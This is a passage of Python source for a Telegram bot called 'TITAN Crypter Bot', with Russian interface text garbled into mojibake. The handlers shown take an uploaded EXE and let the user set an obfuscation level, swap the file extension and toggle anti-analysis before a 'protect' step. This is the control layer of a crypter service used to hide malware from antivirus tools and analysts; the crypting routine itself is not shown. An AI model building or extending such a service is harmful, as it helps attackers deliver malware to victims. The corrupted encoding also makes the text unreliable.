                    [InlineKeyboardButton("‚ùì –ü–æ–º–æ—â—å", callback_data="help")]
                ]
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.edit_message_text(
                    "üîí <b>TITAN Crypter Bot</b>\n\n–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:",
                    reply_markup=reply_markup,
                    parse_mode='HTML'
                )
                
            elif data == "upload_file":
                await query.edit_message_text(
                    "üìÅ <b>–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–∞–π–ª–∞</b>\n\n"
                    "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ EXE —Ñ–∞–π–ª –∫–∞–∫ –¥–æ–∫—É–º–µ–Ω—Ç:",
                    parse_mode='HTML'
                )
                
            elif data == "settings":
                await self.show_settings(update, context)
                
            elif data == "help":
                await self.help_command(update, context)
                
            elif data == "configure":
                await self.show_settings(update, context)
                
            elif data == "set_obfuscation":
                await self.show_obfuscation_menu(update, context)
                
            elif data == "set_extension":
                await self.show_extension_menu(update, context)
                
            elif data.startswith("set_obl_"):
                level = int(data.split('_')[2])
                self.user_sessions[chat_id]['settings']['obfuscation_level'] = level
                await query.edit_message_text(f"‚úÖ –£—Ä–æ–≤–µ–Ω—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω: {level}")
                await asyncio.sleep(1)
                await self.show_settings(update, context)
                
            elif data.startswith("set_ext_"):
                extension = data.split('_', 2)[2]
                self.user_sessions[chat_id]['settings']['extension'] = extension
                await query.edit_message_text(f"‚úÖ –†–∞—Å—à–∏—Ä–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ: {extension}")
                await asyncio.sleep(1)
                await self.show_settings(update, context)
                
            elif data == "toggle_anti_analysis":
                current = self.user_sessions[chat_id]['settings']['anti_analysis']
                self.user_sessions[chat_id]['settings']['anti_analysis'] = not current
                status = "–≤–∫–ª—é—á–µ–Ω" if not current else "–≤—ã–∫–ª—é—á–µ–Ω"
                await query.edit_message_text(f"‚úÖ –ê–Ω—Ç–∏-–∞–Ω–∞–ª–∏–∑ {status}")
                await asyncio.sleep(1)
                await self.show_settings(update, context)
                
            elif data == "save_settings":
                await query.edit_message_text("‚úÖ –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã!")
                await asyncio.sleep(1)
                await self.show_settings(update, context)
                
            elif data == "protect":
                if not self.user_sessions[chat_id].get('file_path'):
                    await query.edit_message_text("‚ùå –°–Ω–∞—á–∞–ª–∞ –∑–∞–≥—Ä—É–∑–∏—Ç–µ —Ñ–∞–π–ª!")
                    return
                    
                await query.edit_message_text("üöÄ –ó–∞–ø—É—Å–∫ –∑–∞—â–∏—Ç—ã...")
                
                # –ó–∞–ø—É—Å–∫ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
                thread = threading.Thread(
                    target=self.run_async_in_thread,
                    args=(chat_id, context)
                )
                thread.daemon = True
                thread.start()
                
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ button_handler: {e}")

    def run(self):
        """–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞"""
        try:
            logger.info("–ë–æ—Ç –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...")
            print("Titan Crypter Bot –∑–∞–ø—É—Å–∫–∞–µ—Ç—Å—è...")
            print(f"–¢–æ–∫–µ–Ω: {BOT_TOKEN}")
            print(f"Admin ID: {ADMIN_CHAT_ID}")
            
            # –ò—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –∑–∞–ø—É—Å–∫ polling
            self.application.run_polling(
                allowed_updates=Update.ALL_TYPES,
                drop_pending_updates=True
            )
            
        except KeyboardInterrupt:
            logger.info("–ë–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º")
            print("\n–ë–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
        except Exception as e:
            logger.error(f"–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ: {e}")
            print(f"–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞: {e}")

if __name__ == "__main__":
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("‚ùå –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —Ç–æ–∫–µ–Ω –±–æ—Ç–∞!")
        exit(1)
        
    bot = TitanCrypterBot()
    bot.run()
